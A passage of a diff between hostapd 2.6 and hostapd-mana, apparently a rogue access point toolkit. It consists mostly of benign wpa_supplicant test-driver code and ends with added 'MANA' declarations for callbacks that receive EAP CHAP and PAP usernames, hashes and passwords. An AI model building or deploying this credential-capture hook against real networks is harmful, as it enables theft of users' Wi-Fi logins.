> 	drv_event_eapol_rx(drv->ctx, src, data, data_len);
> }
> 
> 
> static void wpa_driver_test_mlme(struct wpa_driver_test_data *drv,
> 				 struct sockaddr *from,
> 				 socklen_t fromlen,
> 				 const u8 *data, size_t data_len)
> {
> 	int freq = 0, own_freq;
> 	union wpa_event_data event;
> 	const struct ieee80211_mgmt *mgmt;
> 	u16 fc;
> 	struct test_driver_bss *bss;
> 
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 	if (data_len > 6 && os_memcmp(data, "freq=", 5) == 0) {
> 		size_t pos;
> 		for (pos = 5; pos < data_len; pos++) {
> 			if (data[pos] == ' ')
> 				break;
> 		}
> 		if (pos < data_len) {
> 			freq = atoi((const char *) &data[5]);
> 			wpa_printf(MSG_DEBUG, "test_driver(%s): MLME RX on "
> 				   "freq %d MHz", bss->ifname, freq);
> 			pos++;
> 			data += pos;
> 			data_len -= pos;
> 		}
> 	}
> 
> 	if (drv->remain_on_channel_freq)
> 		own_freq = drv->remain_on_channel_freq;
> 	else
> 		own_freq = drv->current_freq;
> 
> 	if (freq && own_freq && freq != own_freq) {
> 		wpa_printf(MSG_DEBUG, "test_driver(%s): Ignore MLME RX on "
> 			   "another frequency %d MHz (own %d MHz)",
> 			   bss->ifname, freq, own_freq);
> 		return;
> 	}
> 
> 	os_memset(&event, 0, sizeof(event));
> 	event.mlme_rx.buf = data;
> 	event.mlme_rx.len = data_len;
> 	event.mlme_rx.freq = freq;
> 	wpa_supplicant_event(drv->ctx, EVENT_MLME_RX, &event);
> 
> 	mgmt = (const struct ieee80211_mgmt *) data;
> 	fc = le_to_host16(mgmt->frame_control);
> 
> 	if (drv->probe_req_report && data_len >= 24) {
> 		if (WLAN_FC_GET_TYPE(fc) == WLAN_FC_TYPE_MGMT &&
> 		    WLAN_FC_GET_STYPE(fc) == WLAN_FC_STYPE_PROBE_REQ) {
> 			os_memset(&event, 0, sizeof(event));
> 			event.rx_probe_req.sa = mgmt->sa;
> 			event.rx_probe_req.da = mgmt->da;
> 			event.rx_probe_req.bssid = mgmt->bssid;
> 			event.rx_probe_req.ie = mgmt->u.probe_req.variable;
> 			event.rx_probe_req.ie_len =
> 				data_len - (mgmt->u.probe_req.variable - data);
> 			wpa_supplicant_event(drv->ctx, EVENT_RX_PROBE_REQ,
> 					     &event);
> 		}
> 	}
> }
> 
> 
> static void wpa_driver_test_scan_cmd(struct wpa_driver_test_data *drv,
> 				     struct sockaddr *from,
> 				     socklen_t fromlen,
> 				     const u8 *data, size_t data_len)
> {
> 	char buf[512], *pos, *end;
> 	int ret;
> 	struct test_driver_bss *bss;
> 
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 
> 	/* data: optional [ STA-addr | ' ' | IEs(hex) ] */
> 
> 	if (bss == NULL || !drv->ibss)
> 		return;
> 
> 	pos = buf;
> 	end = buf + sizeof(buf);
> 
> 	/* reply: SCANRESP BSSID SSID IEs */
> 	ret = snprintf(pos, end - pos, "SCANRESP " MACSTR " ",
> 		       MAC2STR(bss->bssid));
> 	if (ret < 0 || ret >= end - pos)
> 		return;
> 	pos += ret;
> 	pos += wpa_snprintf_hex(pos, end - pos,
> 				bss->ssid, bss->ssid_len);
> 	ret = snprintf(pos, end - pos, " ");
> 	if (ret < 0 || ret >= end - pos)
> 		return;
> 	pos += ret;
> 	pos += wpa_snprintf_hex(pos, end - pos, drv->assoc_wpa_ie,
> 				drv->assoc_wpa_ie_len);
> 
> 	if (bss->privacy) {
> 		ret = snprintf(pos, end - pos, " PRIVACY");
> 		if (ret < 0 || ret >= end - pos)
> 			return;
> 		pos += ret;
> 	}
> 
> 	ret = snprintf(pos, end - pos, " IBSS");
> 	if (ret < 0 || ret >= end - pos)
> 		return;
> 	pos += ret;
> 
> 	sendto(drv->test_socket, buf, pos - buf, 0,
> 	       (struct sockaddr *) from, fromlen);
> }
> 
> 
> static void wpa_driver_test_receive_unix(int sock, void *eloop_ctx,
> 					 void *sock_ctx)
> {
> 	struct wpa_driver_test_data *drv = eloop_ctx;
> 	char *buf;
> 	int res;
> 	struct sockaddr_storage from;
> 	socklen_t fromlen = sizeof(from);
> 	const size_t buflen = 2000;
> 
> 	if (drv->ap) {
> 		test_driver_receive_unix(sock, eloop_ctx, sock_ctx);
> 		return;
> 	}
> 
> 	buf = os_malloc(buflen);
> 	if (buf == NULL)
> 		return;
> 	res = recvfrom(sock, buf, buflen - 1, 0,
> 		       (struct sockaddr *) &from, &fromlen);
> 	if (res < 0) {
> 		perror("recvfrom(test_socket)");
> 		os_free(buf);
> 		return;
> 	}
> 	buf[res] = '\0';
> 
> 	wpa_printf(MSG_DEBUG, "test_driver: received %u bytes", res);
> 
> 	if (os_strncmp(buf, "SCANRESP ", 9) == 0) {
> 		wpa_driver_test_scanresp(drv, (struct sockaddr *) &from,
> 					 fromlen, buf + 9);
> 	} else if (os_strncmp(buf, "ASSOCRESP ", 10) == 0) {
> 		wpa_driver_test_assocresp(drv, (struct sockaddr *) &from,
> 					  fromlen, buf + 10);
> 	} else if (os_strcmp(buf, "DISASSOC") == 0) {
> 		wpa_driver_test_disassoc(drv, (struct sockaddr *) &from,
> 					 fromlen);
> 	} else if (os_strcmp(buf, "DEAUTH") == 0) {
> 		wpa_driver_test_disassoc(drv, (struct sockaddr *) &from,
> 					 fromlen);
> 	} else if (os_strncmp(buf, "EAPOL ", 6) == 0) {
> 		wpa_driver_test_eapol(drv, (struct sockaddr *) &from, fromlen,
> 				      (const u8 *) buf + 6, res - 6);
> 	} else if (os_strncmp(buf, "MLME ", 5) == 0) {
> 		wpa_driver_test_mlme(drv, (struct sockaddr *) &from, fromlen,
> 				     (const u8 *) buf + 5, res - 5);
> 	} else if (os_strncmp(buf, "SCAN ", 5) == 0) {
> 		wpa_driver_test_scan_cmd(drv, (struct sockaddr *) &from,
> 					 fromlen,
> 					 (const u8 *) buf + 5, res - 5);
> 	} else {
> 		wpa_hexdump_ascii(MSG_DEBUG, "Unknown test_socket command",
> 				  (u8 *) buf, res);
> 	}
> 	os_free(buf);
> }
> 
> 
> static void * wpa_driver_test_init2(void *ctx, const char *ifname,
> 				    void *global_priv)
> {
> 	struct wpa_driver_test_data *drv;
> 	struct wpa_driver_test_global *global = global_priv;
> 	struct test_driver_bss *bss;
> 
> 	drv = test_alloc_data(ctx, ifname);
> 	if (drv == NULL)
> 		return NULL;
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 	drv->global = global_priv;
> 	drv->test_socket = -1;
> 
> 	/* Set dummy BSSID and SSID for testing. */
> 	bss->bssid[0] = 0x02;
> 	bss->bssid[1] = 0x00;
> 	bss->bssid[2] = 0x00;
> 	bss->bssid[3] = 0x00;
> 	bss->bssid[4] = 0x00;
> 	bss->bssid[5] = 0x01;
> 	os_memcpy(bss->ssid, "test", 5);
> 	bss->ssid_len = 4;
> 
> 	if (global->bss_add_used) {
> 		os_memcpy(drv->own_addr, global->req_addr, ETH_ALEN);
> 		global->bss_add_used = 0;
> 	}
> 
> 	eloop_register_timeout(1, 0, wpa_driver_test_poll, drv, NULL);
> 
> 	return bss;
> }
> 
> 
> static void wpa_driver_test_close_test_socket(struct wpa_driver_test_data *drv)
> {
> 	if (drv->test_socket >= 0) {
> 		eloop_unregister_read_sock(drv->test_socket);
> 		close(drv->test_socket);
> 		drv->test_socket = -1;
> 	}
> 
> 	if (drv->own_socket_path) {
> 		unlink(drv->own_socket_path);
> 		os_free(drv->own_socket_path);
> 		drv->own_socket_path = NULL;
> 	}
> }
> 
> 
> static void wpa_driver_test_deinit(void *priv)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_client_socket *cli, *prev;
> 	int i;
> 
> 	cli = drv->cli;
> 	while (cli) {
> 		prev = cli;
> 		cli = cli->next;
> 		os_free(prev);
> 	}
> 
> #ifdef HOSTAPD
> 	/* There should be only one BSS remaining at this point. */
> 	if (dl_list_len(&drv->bss) != 1)
> 		wpa_printf(MSG_ERROR, "%s: %u remaining BSS entries",
> 			   __func__, dl_list_len(&drv->bss));
> #endif /* HOSTAPD */
> 
> 	test_driver_free_bsses(drv);
> 
> 	wpa_driver_test_close_test_socket(drv);
> 	eloop_cancel_timeout(wpa_driver_test_scan_timeout, drv, drv->ctx);
> 	eloop_cancel_timeout(wpa_driver_test_poll, drv, NULL);
> 	eloop_cancel_timeout(test_remain_on_channel_timeout, drv, NULL);
> 	os_free(drv->test_dir);
> 	for (i = 0; i < MAX_SCAN_RESULTS; i++)
> 		os_free(drv->scanres[i]);
> 	os_free(drv->probe_req_ie);
> 	wpa_trace_remove_ref(drv, ctx, drv->ctx);
> 	os_free(drv);
> }
> 
> 
> static int wpa_driver_test_attach(struct wpa_driver_test_data *drv,
> 				  const char *dir, int ap)
> {
> #ifdef DRIVER_TEST_UNIX
> 	static unsigned int counter = 0;
> 	struct sockaddr_un addr;
> 	size_t len;
> 
> 	os_free(drv->own_socket_path);
> 	if (dir) {
> 		len = os_strlen(dir) + 30;
> 		drv->own_socket_path = os_malloc(len);
> 		if (drv->own_socket_path == NULL)
> 			return -1;
> 		os_snprintf(drv->own_socket_path, len, "%s/%s-" MACSTR,
> 			    dir, ap ? "AP" : "STA", MAC2STR(drv->own_addr));
> 	} else {
> 		drv->own_socket_path = os_malloc(100);
> 		if (drv->own_socket_path == NULL)
> 			return -1;
> 		os_snprintf(drv->own_socket_path, 100,
> 			    "/tmp/wpa_supplicant_test-%d-%d",
> 			    getpid(), counter++);
> 	}
> 
> 	drv->test_socket = socket(PF_UNIX, SOCK_DGRAM, 0);
> 	if (drv->test_socket < 0) {
> 		perror("socket(PF_UNIX)");
> 		os_free(drv->own_socket_path);
> 		drv->own_socket_path = NULL;
> 		return -1;
> 	}
> 
> 	os_memset(&addr, 0, sizeof(addr));
> 	addr.sun_family = AF_UNIX;
> 	os_strlcpy(addr.sun_path, drv->own_socket_path, sizeof(addr.sun_path));
> 	if (bind(drv->test_socket, (struct sockaddr *) &addr,
> 		 sizeof(addr)) < 0) {
> 		perror("test-driver-attach: bind(PF_UNIX)");
> 		close(drv->test_socket);
> 		unlink(drv->own_socket_path);
> 		os_free(drv->own_socket_path);
> 		drv->own_socket_path = NULL;
> 		return -1;
> 	}
> 
> 	eloop_register_read_sock(drv->test_socket,
> 				 wpa_driver_test_receive_unix, drv, NULL);
> 
> 	return 0;
> #else /* DRIVER_TEST_UNIX */
> 	return -1;
> #endif /* DRIVER_TEST_UNIX */
> }
> 
> 
> static int wpa_driver_test_attach_udp(struct wpa_driver_test_data *drv,
> 				      char *dst)
> {
> 	char *pos;
> 
> 	pos = os_strchr(dst, ':');
> 	if (pos == NULL)
> 		return -1;
> 	*pos++ = '\0';
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s port=%s", __func__, dst, pos);
> 
> 	drv->test_socket = socket(PF_INET, SOCK_DGRAM, 0);
> 	if (drv->test_socket < 0) {
> 		perror("socket(PF_INET)");
> 		return -1;
> 	}
> 
> 	os_memset(&drv->hostapd_addr_udp, 0, sizeof(drv->hostapd_addr_udp));
> 	drv->hostapd_addr_udp.sin_family = AF_INET;
> #if defined(CONFIG_NATIVE_WINDOWS) || defined(CONFIG_ANSI_C_EXTRA)
> 	{
> 		int a[4];
> 		u8 *pos;
> 		sscanf(dst, "%d.%d.%d.%d", &a[0], &a[1], &a[2], &a[3]);
> 		pos = (u8 *) &drv->hostapd_addr_udp.sin_addr;
> 		*pos++ = a[0];
> 		*pos++ = a[1];
> 		*pos++ = a[2];
> 		*pos++ = a[3];
> 	}
> #else /* CONFIG_NATIVE_WINDOWS or CONFIG_ANSI_C_EXTRA */
> 	inet_aton(dst, &drv->hostapd_addr_udp.sin_addr);
> #endif /* CONFIG_NATIVE_WINDOWS or CONFIG_ANSI_C_EXTRA */
> 	drv->hostapd_addr_udp.sin_port = htons(atoi(pos));
> 
> 	drv->hostapd_addr_udp_set = 1;
> 
> 	eloop_register_read_sock(drv->test_socket,
> 				 wpa_driver_test_receive_unix, drv, NULL);
> 
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_set_param(void *priv, const char *param)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	const char *pos;
> 
> 	wpa_printf(MSG_DEBUG, "%s: param='%s'", __func__, param);
> 	if (param == NULL)
> 		return 0;
> 
> 	wpa_driver_test_close_test_socket(drv);
> 
> #ifdef DRIVER_TEST_UNIX
> 	pos = os_strstr(param, "test_socket=");
> 	if (pos) {
> 		const char *pos2;
> 		size_t len;
> 
> 		pos += 12;
> 		pos2 = os_strchr(pos, ' ');
> 		if (pos2)
> 			len = pos2 - pos;
> 		else
> 			len = os_strlen(pos);
> 		if (len > sizeof(drv->hostapd_addr.sun_path))
> 			return -1;
> 		os_memset(&drv->hostapd_addr, 0, sizeof(drv->hostapd_addr));
> 		drv->hostapd_addr.sun_family = AF_UNIX;
> 		os_memcpy(drv->hostapd_addr.sun_path, pos, len);
> 		drv->hostapd_addr_set = 1;
> 	}
> #endif /* DRIVER_TEST_UNIX */
> 
> 	pos = os_strstr(param, "test_dir=");
> 	if (pos) {
> 		char *end;
> 		os_free(drv->test_dir);
> 		drv->test_dir = os_strdup(pos + 9);
> 		if (drv->test_dir == NULL)
> 			return -1;
> 		end = os_strchr(drv->test_dir, ' ');
> 		if (end)
> 			*end = '\0';
> 		if (wpa_driver_test_attach(drv, drv->test_dir, 0))
> 			return -1;
> 	} else {
> 		pos = os_strstr(param, "test_udp=");
> 		if (pos) {
> 			char *dst, *epos;
> 			dst = os_strdup(pos + 9);
> 			if (dst == NULL)
> 				return -1;
> 			epos = os_strchr(dst, ' ');
> 			if (epos)
> 				*epos = '\0';
> 			if (wpa_driver_test_attach_udp(drv, dst))
> 				return -1;
> 			os_free(dst);
> 		} else if (wpa_driver_test_attach(drv, NULL, 0))
> 			return -1;
> 	}
> 
> 	if (os_strstr(param, "use_associnfo=1")) {
> 		wpa_printf(MSG_DEBUG, "test_driver: Use AssocInfo events");
> 		drv->use_associnfo = 1;
> 	}
> 
> 	return 0;
> }
> 
> 
> static const u8 * wpa_driver_test_get_mac_addr(void *priv)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "%s", __func__);
> 	return drv->own_addr;
> }
> 
> 
> static int wpa_driver_test_send_eapol(void *priv, const u8 *dest, u16 proto,
> 				      const u8 *data, size_t data_len)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	char *msg;
> 	size_t msg_len;
> 	struct l2_ethhdr eth;
> 	struct sockaddr *addr;
> 	socklen_t alen;
> #ifdef DRIVER_TEST_UNIX
> 	struct sockaddr_un addr_un;
> #endif /* DRIVER_TEST_UNIX */
> 
> 	wpa_hexdump(MSG_MSGDUMP, "test_send_eapol TX frame", data, data_len);
> 
> 	os_memset(&eth, 0, sizeof(eth));
> 	os_memcpy(eth.h_dest, dest, ETH_ALEN);
> 	os_memcpy(eth.h_source, drv->own_addr, ETH_ALEN);
> 	eth.h_proto = host_to_be16(proto);
> 
> 	msg_len = 6 + sizeof(eth) + data_len;
> 	msg = os_malloc(msg_len);
> 	if (msg == NULL)
> 		return -1;
> 	os_memcpy(msg, "EAPOL ", 6);
> 	os_memcpy(msg + 6, &eth, sizeof(eth));
> 	os_memcpy(msg + 6 + sizeof(eth), data, data_len);
> 
> 	if (os_memcmp(dest, dbss->bssid, ETH_ALEN) == 0 ||
> 	    drv->test_dir == NULL) {
> 		if (drv->hostapd_addr_udp_set) {
> 			addr = (struct sockaddr *) &drv->hostapd_addr_udp;
> 			alen = sizeof(drv->hostapd_addr_udp);
> 		} else {
> #ifdef DRIVER_TEST_UNIX
> 			addr = (struct sockaddr *) &drv->hostapd_addr;
> 			alen = sizeof(drv->hostapd_addr);
> #else /* DRIVER_TEST_UNIX */
> 			os_free(msg);
> 			return -1;
> #endif /* DRIVER_TEST_UNIX */
> 		}
> 	} else {
> #ifdef DRIVER_TEST_UNIX
> 		struct stat st;
> 		os_memset(&addr_un, 0, sizeof(addr_un));
> 		addr_un.sun_family = AF_UNIX;
> 		os_snprintf(addr_un.sun_path, sizeof(addr_un.sun_path),
> 			    "%s/STA-" MACSTR, drv->test_dir, MAC2STR(dest));
> 		if (stat(addr_un.sun_path, &st) < 0) {
> 			os_snprintf(addr_un.sun_path, sizeof(addr_un.sun_path),
> 				    "%s/AP-" MACSTR,
> 				    drv->test_dir, MAC2STR(dest));
> 		}
> 		addr = (struct sockaddr *) &addr_un;
> 		alen = sizeof(addr_un);
> #else /* DRIVER_TEST_UNIX */
> 		os_free(msg);
> 		return -1;
> #endif /* DRIVER_TEST_UNIX */
> 	}
> 
> 	if (sendto(drv->test_socket, msg, msg_len, 0, addr, alen) < 0) {
> 		perror("sendmsg(test_socket)");
> 		os_free(msg);
> 		return -1;
> 	}
> 
> 	os_free(msg);
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_get_capa(void *priv, struct wpa_driver_capa *capa)
> {
> 	os_memset(capa, 0, sizeof(*capa));
> 	capa->key_mgmt = WPA_DRIVER_CAPA_KEY_MGMT_WPA |
> 		WPA_DRIVER_CAPA_KEY_MGMT_WPA2 |
> 		WPA_DRIVER_CAPA_KEY_MGMT_WPA_PSK |
> 		WPA_DRIVER_CAPA_KEY_MGMT_WPA2_PSK |
> 		WPA_DRIVER_CAPA_KEY_MGMT_WPA_NONE |
> 		WPA_DRIVER_CAPA_KEY_MGMT_FT |
> 		WPA_DRIVER_CAPA_KEY_MGMT_FT_PSK;
> 	capa->enc = WPA_DRIVER_CAPA_ENC_WEP40 |
> 		WPA_DRIVER_CAPA_ENC_WEP104 |
> 		WPA_DRIVER_CAPA_ENC_TKIP |
> 		WPA_DRIVER_CAPA_ENC_CCMP;
> 	capa->auth = WPA_DRIVER_AUTH_OPEN |
> 		WPA_DRIVER_AUTH_SHARED |
> 		WPA_DRIVER_AUTH_LEAP;
> 	capa->flags |= WPA_DRIVER_FLAGS_AP;
> 	capa->flags |= WPA_DRIVER_FLAGS_P2P_CONCURRENT;
> 	capa->flags |= WPA_DRIVER_FLAGS_P2P_DEDICATED_INTERFACE;
> 	capa->flags |= WPA_DRIVER_FLAGS_P2P_CAPABLE;
> 	capa->max_scan_ssids = 2;
> 	capa->max_remain_on_chan = 60000;
> 
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_mlme_setprotection(void *priv, const u8 *addr,
> 					      int protect_type,
> 					      int key_type)
> {
> 	wpa_printf(MSG_DEBUG, "%s: protect_type=%d key_type=%d",
> 		   __func__, protect_type, key_type);
> 
> 	if (addr) {
> 		wpa_printf(MSG_DEBUG, "%s: addr=" MACSTR,
> 			   __func__, MAC2STR(addr));
> 	}
> 
> 	return 0;
> }
> 
> 
> static void * wpa_driver_test_global_init(void)
> {
> 	struct wpa_driver_test_global *global;
> 
> 	global = os_zalloc(sizeof(*global));
> 	return global;
> }
> 
> 
> static void wpa_driver_test_global_deinit(void *priv)
> {
> 	struct wpa_driver_test_global *global = priv;
> 	os_free(global);
> }
> 
> 
> static struct wpa_interface_info *
> wpa_driver_test_get_interfaces(void *global_priv)
> {
> 	/* struct wpa_driver_test_global *global = priv; */
> 	struct wpa_interface_info *iface;
> 
> 	iface = os_zalloc(sizeof(*iface));
> 	if (iface == NULL)
> 		return iface;
> 	iface->ifname = os_strdup("sta0");
> 	iface->desc = os_strdup("test interface 0");
> 	iface->drv_name = "test";
> 	iface->next = os_zalloc(sizeof(*iface));
> 	if (iface->next) {
> 		iface->next->ifname = os_strdup("sta1");
> 		iface->next->desc = os_strdup("test interface 1");
> 		iface->next->drv_name = "test";
> 	}
> 
> 	return iface;
> }
> 
> 
> static struct hostapd_hw_modes *
> wpa_driver_test_get_hw_feature_data(void *priv, u16 *num_modes, u16 *flags)
> {
> 	struct hostapd_hw_modes *modes;
> 	size_t i;
> 
> 	*num_modes = 3;
> 	*flags = 0;
> 	modes = os_calloc(*num_modes, sizeof(struct hostapd_hw_modes));
> 	if (modes == NULL)
> 		return NULL;
> 	modes[0].mode = HOSTAPD_MODE_IEEE80211G;
> 	modes[0].num_channels = 11;
> 	modes[0].num_rates = 12;
> 	modes[0].channels = os_calloc(11, sizeof(struct hostapd_channel_data));
> 	modes[0].rates = os_calloc(modes[0].num_rates, sizeof(int));
> 	if (modes[0].channels == NULL || modes[0].rates == NULL)
> 		goto fail;
> 	for (i = 0; i < 11; i++) {
> 		modes[0].channels[i].chan = i + 1;
> 		modes[0].channels[i].freq = 2412 + 5 * i;
> 		modes[0].channels[i].flag = 0;
> 	}
> 	modes[0].rates[0] = 10;
> 	modes[0].rates[1] = 20;
> 	modes[0].rates[2] = 55;
> 	modes[0].rates[3] = 110;
> 	modes[0].rates[4] = 60;
> 	modes[0].rates[5] = 90;
> 	modes[0].rates[6] = 120;
> 	modes[0].rates[7] = 180;
> 	modes[0].rates[8] = 240;
> 	modes[0].rates[9] = 360;
> 	modes[0].rates[10] = 480;
> 	modes[0].rates[11] = 540;
> 
> 	modes[1].mode = HOSTAPD_MODE_IEEE80211B;
> 	modes[1].num_channels = 11;
> 	modes[1].num_rates = 4;
> 	modes[1].channels = os_calloc(11, sizeof(struct hostapd_channel_data));
> 	modes[1].rates = os_calloc(modes[1].num_rates, sizeof(int));
> 	if (modes[1].channels == NULL || modes[1].rates == NULL)
> 		goto fail;
> 	for (i = 0; i < 11; i++) {
> 		modes[1].channels[i].chan = i + 1;
> 		modes[1].channels[i].freq = 2412 + 5 * i;
> 		modes[1].channels[i].flag = 0;
> 	}
> 	modes[1].rates[0] = 10;
> 	modes[1].rates[1] = 20;
> 	modes[1].rates[2] = 55;
> 	modes[1].rates[3] = 110;
> 
> 	modes[2].mode = HOSTAPD_MODE_IEEE80211A;
> 	modes[2].num_channels = 1;
> 	modes[2].num_rates = 8;
> 	modes[2].channels = os_calloc(1, sizeof(struct hostapd_channel_data));
> 	modes[2].rates = os_calloc(modes[2].num_rates, sizeof(int));
> 	if (modes[2].channels == NULL || modes[2].rates == NULL)
> 		goto fail;
> 	modes[2].channels[0].chan = 60;
> 	modes[2].channels[0].freq = 5300;
> 	modes[2].channels[0].flag = 0;
> 	modes[2].rates[0] = 60;
> 	modes[2].rates[1] = 90;
> 	modes[2].rates[2] = 120;
> 	modes[2].rates[3] = 180;
> 	modes[2].rates[4] = 240;
> 	modes[2].rates[5] = 360;
> 	modes[2].rates[6] = 480;
> 	modes[2].rates[7] = 540;
> 
> 	return modes;
> 
> fail:
> 	if (modes) {
> 		for (i = 0; i < *num_modes; i++) {
> 			os_free(modes[i].channels);
> 			os_free(modes[i].rates);
> 		}
> 		os_free(modes);
> 	}
> 	return NULL;
> }
> 
> 
> static int wpa_driver_test_set_freq(void *priv,
> 				    struct hostapd_freq_params *freq)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "test: set_freq %u MHz", freq->freq);
> 	drv->current_freq = freq->freq;
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_send_action(void *priv, unsigned int freq,
> 				       unsigned int wait,
> 				       const u8 *dst, const u8 *src,
> 				       const u8 *bssid,
> 				       const u8 *data, size_t data_len,
> 				       int no_cck)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	int ret = -1;
> 	u8 *buf;
> 	struct ieee80211_hdr *hdr;
> 
> 	wpa_printf(MSG_DEBUG, "test: Send Action frame");
> 
> 	if ((drv->remain_on_channel_freq &&
> 	     freq != drv->remain_on_channel_freq) ||
> 	    (drv->remain_on_channel_freq == 0 &&
> 	     freq != (unsigned int) drv->current_freq)) {
> 		wpa_printf(MSG_DEBUG, "test: Reject Action frame TX on "
> 			   "unexpected channel: freq=%u MHz (current_freq=%u "
> 			   "MHz, remain-on-channel freq=%u MHz)",
> 			   freq, drv->current_freq,
> 			   drv->remain_on_channel_freq);
> 		return -1;
> 	}
> 
> 	buf = os_zalloc(24 + data_len);
> 	if (buf == NULL)
> 		return ret;
> 	os_memcpy(buf + 24, data, data_len);
> 	hdr = (struct ieee80211_hdr *) buf;
> 	hdr->frame_control =
> 		IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_ACTION);
> 	os_memcpy(hdr->addr1, dst, ETH_ALEN);
> 	os_memcpy(hdr->addr2, src, ETH_ALEN);
> 	os_memcpy(hdr->addr3, bssid, ETH_ALEN);
> 
> 	ret = wpa_driver_test_send_mlme(priv, buf, 24 + data_len, 0);
> 	os_free(buf);
> 	return ret;
> }
> 
> 
> static void test_remain_on_channel_timeout(void *eloop_ctx, void *timeout_ctx)
> {
> 	struct wpa_driver_test_data *drv = eloop_ctx;
> 	union wpa_event_data data;
> 
> 	wpa_printf(MSG_DEBUG, "test: Remain-on-channel timeout");
> 
> 	os_memset(&data, 0, sizeof(data));
> 	data.remain_on_channel.freq = drv->remain_on_channel_freq;
> 	data.remain_on_channel.duration = drv->remain_on_channel_duration;
> 
> 	drv->remain_on_channel_freq = 0;
> 
> 	wpa_supplicant_event(drv->ctx, EVENT_CANCEL_REMAIN_ON_CHANNEL, &data);
> }
> 
> 
> static int wpa_driver_test_remain_on_channel(void *priv, unsigned int freq,
> 					     unsigned int duration)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	union wpa_event_data data;
> 
> 	wpa_printf(MSG_DEBUG, "%s(freq=%u, duration=%u)",
> 		   __func__, freq, duration);
> 	if (drv->remain_on_channel_freq &&
> 	    drv->remain_on_channel_freq != freq) {
> 		wpa_printf(MSG_DEBUG, "test: Refuse concurrent "
> 			   "remain_on_channel request");
> 		return -1;
> 	}
> 
> 	drv->remain_on_channel_freq = freq;
> 	drv->remain_on_channel_duration = duration;
> 	eloop_cancel_timeout(test_remain_on_channel_timeout, drv, NULL);
> 	eloop_register_timeout(duration / 1000, (duration % 1000) * 1000,
> 			       test_remain_on_channel_timeout, drv, NULL);
> 
> 	os_memset(&data, 0, sizeof(data));
> 	data.remain_on_channel.freq = freq;
> 	data.remain_on_channel.duration = duration;
> 	wpa_supplicant_event(drv->ctx, EVENT_REMAIN_ON_CHANNEL, &data);
> 
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_cancel_remain_on_channel(void *priv)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "%s", __func__);
> 	if (!drv->remain_on_channel_freq)
> 		return -1;
> 	drv->remain_on_channel_freq = 0;
> 	eloop_cancel_timeout(test_remain_on_channel_timeout, drv, NULL);
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_probe_req_report(void *priv, int report)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "%s(report=%d)", __func__, report);
> 	drv->probe_req_report = report;
> 	return 0;
> }
> 
> 
> const struct wpa_driver_ops wpa_driver_test_ops = {
> 	"test",
> 	"wpa_supplicant test driver",
> 	.hapd_init = test_driver_init,
> 	.hapd_deinit = wpa_driver_test_deinit,
> 	.hapd_send_eapol = test_driver_send_eapol,
> 	.send_mlme = wpa_driver_test_send_mlme,
> 	.set_generic_elem = test_driver_set_generic_elem,
> 	.sta_deauth = test_driver_sta_deauth,
> 	.sta_disassoc = test_driver_sta_disassoc,
> 	.get_hw_feature_data = wpa_driver_test_get_hw_feature_data,
> 	.if_add = test_driver_if_add,
> 	.if_remove = test_driver_if_remove,
> 	.hapd_set_ssid = test_driver_set_ssid,
> 	.set_privacy = test_driver_set_privacy,
> 	.set_sta_vlan = test_driver_set_sta_vlan,
> 	.sta_add = test_driver_sta_add,
> 	.send_ether = test_driver_send_ether,
> 	.set_ap_wps_ie = test_driver_set_ap_wps_ie,
> 	.get_bssid = wpa_driver_test_get_bssid,
> 	.get_ssid = wpa_driver_test_get_ssid,
> 	.set_key = wpa_driver_test_set_key,
> 	.deinit = wpa_driver_test_deinit,
> 	.set_param = wpa_driver_test_set_param,
> 	.deauthenticate = wpa_driver_test_deauthenticate,
> 	.associate = wpa_driver_test_associate,
> 	.get_capa = wpa_driver_test_get_capa,
> 	.get_mac_addr = wpa_driver_test_get_mac_addr,
> 	.send_eapol = wpa_driver_test_send_eapol,
> 	.mlme_setprotection = wpa_driver_test_mlme_setprotection,
> 	.get_scan_results2 = wpa_driver_test_get_scan_results2,
> 	.global_init = wpa_driver_test_global_init,
> 	.global_deinit = wpa_driver_test_global_deinit,
> 	.init2 = wpa_driver_test_init2,
> 	.get_interfaces = wpa_driver_test_get_interfaces,
> 	.scan2 = wpa_driver_test_scan,
> 	.set_freq = wpa_driver_test_set_freq,
> 	.send_action = wpa_driver_test_send_action,
> 	.remain_on_channel = wpa_driver_test_remain_on_channel,
> 	.cancel_remain_on_channel = wpa_driver_test_cancel_remain_on_channel,
> 	.probe_req_report = wpa_driver_test_probe_req_report,
> };
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap.h hostapd-mana/src/eap_server/eap.h
155a156,164
> //MANA Start
> void eap_server_chap_rx_callback(struct eap_sm *sm, const char *source,
> 				   const u8 *username, size_t username_len,
> 				   const u8 *hash, const u8 *salt,
> 				   u8 id);
> void eap_server_pap_rx_callback(struct eap_sm *sm, const char *source,
> 				   const u8 *username, size_t username_len,
> 				   const u8 *password, size_t password_len);
> //MANA End
diff '--color=auto' -rN hostapd-2.6/src/eap_server/eap_server.c hostapd-mana/src/eap_server/eap_server.c
21a22
